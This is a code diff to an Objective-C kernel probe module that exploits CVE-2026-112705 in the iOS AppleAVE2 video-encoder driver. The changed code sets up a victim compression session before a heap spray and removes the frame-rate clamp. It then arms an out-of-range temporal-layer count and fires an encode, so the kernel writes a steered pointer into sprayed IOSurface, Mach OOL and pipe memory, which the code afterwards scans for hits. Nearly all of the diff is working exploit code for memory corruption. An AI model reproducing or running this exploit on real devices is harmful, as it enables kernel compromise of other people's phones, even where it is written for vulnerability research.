@@ -69,10 +69,14 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         _sprayCount = count;
         _marker = marker;
         _ntl = ntl;
-        _identifier = [NSString stringWithFormat:@"ave112705.sprite%d.armed", count];
-        _title = [NSString stringWithFormat:@"AVE2 sprite x%d", count];
+        _identifier = (ntl == 16463)
+            ? [NSString stringWithFormat:@"ave112705.sprite%d.armed", count]
+            : [NSString stringWithFormat:@"ave112705.sprite%d.ntl%d.armed", count, ntl];
+        _title = (ntl == 16463)
+            ? [NSString stringWithFormat:@"AVE2 sprite x%d", count]
+            : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl];
         _subtitle = [NSString stringWithFormat:
-                     @"CVE-2026-112705: shape OOB read with pointer candidates (NTL=%d)", ntl];
+                     @"CVE-2026-112705: raw EncoderUsage=1 + NTL=%d after spray (no 60/15 clamp)", ntl];
         _icon = @"square.grid.3x3.middle.filled";
         _section = KPTestSectionKernelProbes;
     }
@@ -136,59 +140,48 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     const int32_t W = 1280, H = 720;
     const int32_t sw = 64, sh = 64;
 
-    // x0 candidates — exactly the addresses the steered NTL band (15967..16014)
-    // computes: ((NTL-16463) << 32) | 0x59 with the high dword in kheap
-    // 0xfffffe10..0xfffffe3f. Storing these in siblings lets a shaped OOB read
-    // return a value WE chose — a controlled pointer into stp x0, x0, [x0].
+    int ntl = self.ntl;
+    uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
+
+    // x0 candidates — addresses in the steered NTL band (15967..16014) plus
+    // the exact steeredX0 for self.ntl: ((NTL-16463) << 32) | 0x59.
+    // Storing these in siblings and scanning for them in surfaces/OOL/pipes
+    // catches both direct stp x0,x0,[x0] writes and shaped OOB reads.
     uint64_t x0cands[8];
     int ncand = 0;
     for (uint32_t hi = 0x10; hi <= 0x38; hi += 0x08) {
         x0cands[ncand++] = ((uint64_t)(uint32_t)(0xFFFFFE00u + hi) << 32) | 0x59ULL;
     }
+    BOOL hasSteered = NO;
+    for (int c = 0; c < ncand; c++) {
+        if (x0cands[c] == steeredX0) { hasSteered = YES; break; }
+    }
+    if (!hasSteered && ncand < 8) {
+        x0cands[ncand++] = steeredX0;
+    }
+    [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
     [report appendString:@"x0 candidates in spray:\n"];
     for (int c = 0; c < ncand; c++) {
         [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
     }
 
-    // 1) VICTIM session first (analyst recipe: NTL rides in encoderSpecification
-    //    at Create and the unclamp COMMITS at Prepare - PRE readback shows 1,
-    //    POST shows the real value). Encode is forced regardless of readback.
-    NSDictionary *vspec = @{
-        @"EncoderUsage": @1,
-        @"NumberOfTemporalLayers": @3,
-        @"AllowTemporalCompression": @YES,
-    };
+    // 1) VICTIM session created BEFORE spray (so sibling/kheap allocations sit
+    //    adjacent/forward of victim's context), WITHOUT ExpectedFrameRate=60 /
+    //    BaseLayerFrameRate=15 (which forced 1 + log2(60/15) = 3 at prepare)
+    //    and WITHOUT a preliminary NTL=3 IDR frame.
     VTCompressionSessionRef victim = NULL;
     NSMutableArray *vSink = [NSMutableArray array];
     OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                               kCMVideoCodecType_HEVC,
-                                              (__bridge CFDictionaryRef)vspec, NULL, NULL,
+                                              NULL, NULL, NULL,
                                               SpriteAttsCB, (__bridge void *)vSink, &victim);
     if (vst != noErr || !victim) {
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
     }
-    int ntl = self.ntl;
-    VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
-    // Analyst 221032: the session sits at LEGAL NTL=3 (m0 recipe, POST=3
-    // UNCLAMPED). The OOB NTL rides in FRAME PROPERTIES (path-ii), which
-    // returned encode=0 in the post-prepare smash and bypasses the clamp.
-    VTSessionSetProperty(victim, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
-    VTSessionSetProperty(victim, CFSTR("RealTime"), kCFBooleanTrue);
-    VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
-    VTSessionSetProperty(victim, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
-    VTSessionSetProperty(victim, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
-    OSStatus vprep = VTCompressionSessionPrepareToEncodeFrames(victim);
-    int vrb = -1;
-    CFNumberRef vbn = NULL;
-    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
-        CFNumberGetValue(vbn, kCFNumberIntType, &vrb);
-        CFRelease(vbn);
-    }
-    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d prepare=%d readback_POST=%d",
-                   ntl, (int)vprep, vrb]];
-    [report appendFormat:@"victim base NTL POST-prepare readback=%d (want 3); OOB shots carry NTL=%d via frameProps\n",
-     vrb, ntl];
+    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d (unclamped; EncoderUsage+NTL armed after spray)",
+                   (void *)victim, ntl]];
+    [report appendFormat:@"victim session created (%p) before spray; no 60/15 frame-rate clamp\n", (void *)victim];
 
     // 2) SPRAY siblings — same driver, same pInfo allocation class.
     //    Each sibling carries the marker in several int-valued properties so
@@ -302,45 +295,42 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
     [report appendFormat:@"pipe spray: %d x 256KB\n", pipesMade];
 
-    // 3) VICTIM encode — the OOB read fires here. May panic the kernel.
-    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
-    [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d (panic expected; far shows the consumed bytes)", ntl]];
-    if (pb) {
-        // shot 0: clean IDR at legal NTL=3 (fills the encoder context)
-        @synchronized (vSink) { [vSink removeAllObjects]; }
-        if (VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
-                                            NULL, NULL, NULL) == noErr) {
-            SpriteDrain(victim, vSink, 1, 200);
-        }
-        // shot 1: path-ii - the OOB NTL in frameProperties
-        NSDictionary *shot1 = @{ @"NumberOfTemporalLayers": @(ntl) };
-        @synchronized (vSink) { [vSink removeAllObjects]; }
-        OSStatus s1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
-                                                      (__bridge CFDictionaryRef)shot1, NULL, NULL);
-        [report appendFormat:@"shot-ii frameProps NTL=%d -> %d\n", ntl, (int)s1];
-        if (s1 == noErr) SpriteDrain(victim, vSink, 1, 200);
-        // shot 2: post-IDR session setter (no re-prepare)
-        CFNumberRef sm = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
-        OSStatus s2 = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), sm);
-        CFRelease(sm);
-        int postV = -1;
-        CFNumberRef rbv = NULL;
-        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbv) == noErr && rbv) {
-            CFNumberGetValue(rbv, kCFNumberIntType, &postV); CFRelease(rbv);
-        }
-        [report appendFormat:@"shot-i post-IDR set=%d readback=%d\n", (int)s2, postV];
-        // shot 3: the panic rung in frameProperties
-        NSDictionary *shot3 = @{ @"NumberOfTemporalLayers": @16463 };
-        @synchronized (vSink) { [vSink removeAllObjects]; }
-        OSStatus s3 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(2, 30), kCMTimeInvalid,
-                                                      (__bridge CFDictionaryRef)shot3, NULL, NULL);
-        [report appendFormat:@"shot-iii frameProps NTL=16463 -> %d\n", (int)s3];
-        if (s3 == noErr) SpriteDrain(victim, vSink, 1, 200);
+    // 3) ARM VICTIM AFTER SPRAY & FIRE FIRST ENCODE
+    //    Matches working trigger in KPAuditAVE112705Module.m: set EncoderUsage=1
+    //    and NumberOfTemporalLayers=ntl on the un-prepared session (no 60/15
+    //    BaseLayerFrameRate clamp, no preliminary NTL=3 IDR frame), then fire
+    //    the very first VTCompressionSessionEncodeFrame so AppleAVE2 stream-init
+    //    executes stp x0, x0, [x0] (__TEXT_EXEC+0xDA78) directly against our spray.
+    OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+    OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
+    int vrb = -1;
+    CFNumberRef vbn = NULL;
+    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
+        CFNumberGetValue(vbn, kCFNumberIntType, &vrb);
+        CFRelease(vbn);
     }
-    [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];
+    [report appendFormat:@"victim post-spray arm: EncoderUsage=%d NTL_set(%d)=%d readback=%d steered_x0=0x%016llx\n",
+     (int)uSt, ntl, (int)nSt, vrb, steeredX0];
+
+    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
+    [self journal:[NSString stringWithFormat:
+                   @"BEFORE_VICTIM_ENCODE ntl=%d set=%d readback=%d x0=0x%016llx (first encode -> stream init stp x0,x0,[x0])",
+                   ntl, (int)nSt, vrb, steeredX0]];
+    if (pb) {
+        @synchronized (vSink) { [vSink removeAllObjects]; }
+        OSStatus e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
+                                                      NULL, NULL, NULL);
+        if (e0 == noErr) {
+            SpriteDrain(victim, vSink, 1, 500);
+        }
+        NSString *cb0 = nil;
+        @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
+        [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@)\n", ntl, (int)e0, cb0];
+    }
+    [self journal:[NSString stringWithFormat:@"AFTER_VICTIM_ENCODE survived ntl=%d — scanning spray for stp [x0,x0,x0,0]", ntl]];
 
     // Scan the fixed-page spray for the stp x0,x0,[x0] signature: the written
-    // qwords equal x0 (a candidate) or the marker pair.
+    // qwords equal x0 (steeredX0 / candidate) or the marker pair.
     if (surfArray) {
         long hits = 0;
         CFIndex scount = CFArrayGetCount(surfArray);
@@ -353,12 +343,14 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             if (base && sz >= 32) {
                 for (size_t off = 0; off + 32 <= sz; off += 8) {
                     uint64_t q = *(uint64_t *)(base + off);
+                    if (q == 0) continue;
                     int match = -1;
                     for (int c = 0; c < ncand; c++) {
                         if (q == x0cands[c]) { match = c; break; }
                     }
-                    uint64_t markerPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
-                    if (match < 0 && q == markerPair) match = 100 + (int)(q & 0xff);
+                    if (match < 0 && (uint32_t)q == 0x59u) match = 59;
+                    uint64_t mPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
+                    if (match < 0 && q == mPair) match = 100 + (int)(q & 0xff);
                     if (match >= 0) {
                         uint64_t q2 = *(uint64_t *)(base + off + 8);
                         uint32_t z = *(uint32_t *)(base + off + 0x18);
@@ -379,7 +371,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
 
     // Read back OOL queues and pipes: a landed stp write shows as the signature
-    // [x0, x0, x0, 0] embedded in the marker-tiled content.
+    // [x0, x0, x0, 0] embedded in the marker-tiled content (or any non-marker mutation).
     int oolHits = 0, pipeHits = 0;
     for (int p = 0; p < oolPortCount; p++) {
         for (int m = 0; m < 4; m++) {
@@ -397,16 +389,11 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     uint64_t *oq = (uint64_t *)od->address;
                     size_t nq = od->size / 8;
                     for (size_t i3 = 0; i3 + 4 < nq && oolHits < 8; i3++) {
-                        if (oq[i3] == oq[i3 + 1] && oq[i3] == oq[i3 + 2] &&
-                            oq[i3] != markerPair && (uint32_t)oq[i3 + 3] == 0) {
-                            for (int c = 0; c < ncand; c++) {
-                                if (oq[i3] == x0cands[c]) {
-                                    [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx x0=0x%llx\n",
-                                     p, m, i3 * 8, oq[i3]];
-                                    oolHits++;
-                                    break;
-                                }
-                            }
+                        if (oq[i3] != markerPair) {
+                            [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
+                             p, m, i3 * 8, oq[i3], oq[i3 + 1], oq[i3 + 2], oq[i3 + 3]];
+                            oolHits++;
+                            i3 += 3;
                         }
                     }
                 }
@@ -429,16 +416,11 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 uint64_t *pq = (uint64_t *)pbuf;
                 size_t nq = (size_t)got / 8;
                 for (size_t i3 = 0; i3 + 4 < nq && pipeHits < 8; i3++) {
-                    if (pq[i3] == pq[i3 + 1] && pq[i3] == pq[i3 + 2] &&
-                        pq[i3] != markerPair && (uint32_t)pq[i3 + 3] == 0) {
-                        for (int c = 0; c < ncand; c++) {
-                            if (pq[i3] == x0cands[c]) {
-                                [report appendFormat:@"    PIPE HIT p=%d off=0x%zx x0=0x%llx\n",
-                                 p, i3 * 8, pq[i3]];
-                                pipeHits++;
-                                break;
-                            }
-                        }
+                    if (pq[i3] != markerPair) {
+                        [report appendFormat:@"    PIPE HIT p=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
+                         p, i3 * 8, pq[i3], pq[i3 + 1], pq[i3 + 2], pq[i3 + 3]];
+                        pipeHits++;
+                        i3 += 3;
                     }
                 }
             }
